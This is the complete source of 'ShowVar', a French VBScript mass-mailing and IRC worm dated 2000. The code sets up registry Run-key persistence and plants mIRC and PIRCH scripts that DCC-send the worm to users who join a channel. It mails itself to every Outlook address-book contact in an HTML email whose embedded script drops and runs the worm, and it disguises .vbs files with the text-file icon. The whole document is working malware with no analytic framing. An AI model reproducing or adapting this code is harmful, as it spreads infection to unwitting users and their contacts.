'ShowVar par PetiK 21/01/2000                      
Dim fso,ws,file
Set fso  = CreateObject("Scripting.FileSystemObject")
Set ws   = CreateObject("WScript.Shell")
Set file = fso.OpenTextFile(WScript.ScriptFullName,1)
vbscopie = file.ReadAll

DEBUT()
Sub DEBUT()
On Error Resume Next
Set win  = fso.GetspecialFolder(0)
RUN  = ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ShowVar")
Set c    = fso.GetFile(WScript.ScriptFullName)
ShowVar  = (win&"\Showvar.vbs")
c.Copy   (ShowVar)
ws.RegWrite RUN,ShowVar
If ws.RegRead ("HKCU\Software\ShowVar\MIRC") <> "1" then
Mirc ""
End If
If ws.RegRead ("HKCU\Software\ShowVar\PIRCH") <> "1" then
Pirch ""
End If
if ws.regread ("HKCU\Software\ShowVar\MAIL") <> "1" then
EMail()
End If
Divers()
End Sub

Function Mirc(Path)
'On Error Resume Next
If Path = "" Then
If fso.fileexists("c:\mirc\mirc.ini") Then Path = "c:\mirc"
If fso.fileexists("c:\mirc32\mirc.ini") Then Path = "c:\mirc32"
PFD = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
SV2 = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ShowVar")
If fso.fileexists(PFD & "\mirc\mirc.ini") Then Path = PFD & "\mirc"
End If
If Path <> "" Then
Set Script = fso.CreateTextFile(Path & "\script.ini", True)
Script.writeline "[script]"
Script.writeline "n0=on 1:JOIN:#:{"
Script.writeline "n1=  /if ( $nick == $me ) { halt }"
Script.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick " & SV2
Script.writeline "n3=}"
Script.Close
ws.RegWrite "HKCU\Software\ShowVar\MIRC", "1"
End If
End Function

Function Pirch(path)
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
Set ws = CreateObject("wscript.shell")
If path = "" Then
If fso.fileexists("c:\pirch\Pirch32.exe") Then path = "c:\pirch"
If fso.fileexists("c:\pirch32\Pirch32.exe") Then path = "c:\pirch32"
pfDir = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
SV3 = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ShowVar")
If fso.fileexists(pfDir & "\pirch\Pirch32.exe") Then path = pfDir & "\pirch\Pirch32.exe"
End If
If path <> "" Then
Set Script = fso.CreateTextFile(path & "\events.ini", True)
Script.WriteLine "[Levels]"
Script.WriteLine "Enabled=1"
Script.WriteLine "Count=6"
Script.WriteLine "Level1=000-Unknowns"
Script.WriteLine "000-UnknownsEnabled=1"
Script.WriteLine "Level2=100-Level 100"
Script.WriteLine "100-Level 100Enabled=1"
Script.WriteLine "Level3=200-Level 200"
Script.WriteLine "200-Level 200Enabled=1"
Script.WriteLine "Level4=300-Level 300"
Script.WriteLine " 300-Level 300Enabled=1"
Script.WriteLine "Level5=400-Level 400 "
Script.WriteLine "400-Level 400Enabled=1"
Script.WriteLine "Level6=500-Level 500"
Script.WriteLine "500-Level 500Enabled=1"
Script.WriteLine ""
Script.WriteLine "[000-Unknowns]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[100-Level 100]"
Script.WriteLine "User1=*!*@*"
Script.WriteLine "UserCount=1"
Script.WriteLine "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & SV3
Script.WriteLine "EventCount=1"
Script.WriteLine ""
Script.WriteLine "[200-Level 200]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[300-Level 300]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[400-Level 400]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[500-Level 500]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.Close
End If
ws.RegWrite "HKCU\Software\ShowVar\PIRCH", "1"
End Function

Function EMail()
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
Set Myself = fso.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While Myself.atendofstream = False
MyLine = Myself.readline
Code = Code & Chr(34) & " & vbcrlf & " & Chr(34) & Replace(MyLine, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
Myself.Close
htm = "<HTML><HEAD><META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><STYLE></STYLE></HEAD><BODY bgColor=#ffffff><SCRIPT language=vbscript>"
htm = htm & vbCrLf & "On Error Resume Next"
htm = htm & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
htm = htm & vbCrLf & "If Err.Number <> 0 Then"
htm = htm & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>Pour lire cet EMail, merci d'activer l'option ActiveX.<br>Rouvrez ce message et accepter les ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
htm = htm & vbCrLf & "Else"
htm = htm & vbCrLf & "Set vbs = fso.CreateTextFile(fso.GetSpecialFolder(1) & " & Chr(34) & "\Worm.vbs" & Chr(34) & ", True)"
htm = htm & vbCrLf & "vbs.write  " & Chr(34) & Code & Chr(34)
htm = htm & vbCrLf & "vbs.Close"
htm = htm & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
htm = htm & vbCrLf & "ws.run fso.GetSpecialFolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(1) & " & Chr(34) & "\Worm.vbs %" & Chr(34) & ""
htm2 = htm2 & vbCrLf & "document.write " & Chr(34) & "Ce message contient de nombreux erreurs.<br>Désolé !<br>" & Chr(34) & ""
htm2 = htm2 & vbCrLf & "End If"
htm2 = htm2 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
HtmlBody = htm & htm2
Set mapi = Outlook.GetNameSpace("MAPI")
For Each Addresslist In mapi.AddressLists
If Addresslist.AddressEntries.Count <> 0 Then
AddCount = Addresslist.AddressEntries.Count
Set Msg = Outlook.CreateItem(0)
Msg.Subject = "Salut l'ami. Ouvre vite, la chance peut tourner !!"
Msg.HtmlBody = HtmlBody
Msg.DeleteAfterSubmit = True
For II = 1 To AddCount
Set Addentry = Addresslist.AddressEntries(II)
If AddCount = 1 Then
Msg.BCC = Addentry.Address
Else
Msg.BCC = Msg.BCC & "; " & Addentry.Address
End If
Next
Msg.send
End If
Next
Outlook.Quit
End If
ws.regwrite "HKCU\Software\ShowVar\MAIL", "1"
End Function

Function Divers()
If Day(Now()) = 5 Then
MsgBox "Et si on faisait une partie d'echec ?",vbinformation,"WarGames"
End If
AZE = ws.RegRead ("HKCR\txtfile\DefaultIcon")
ws.RegWrite "HKCR\VBSfile\DefaultIcon\",AZE
End Function
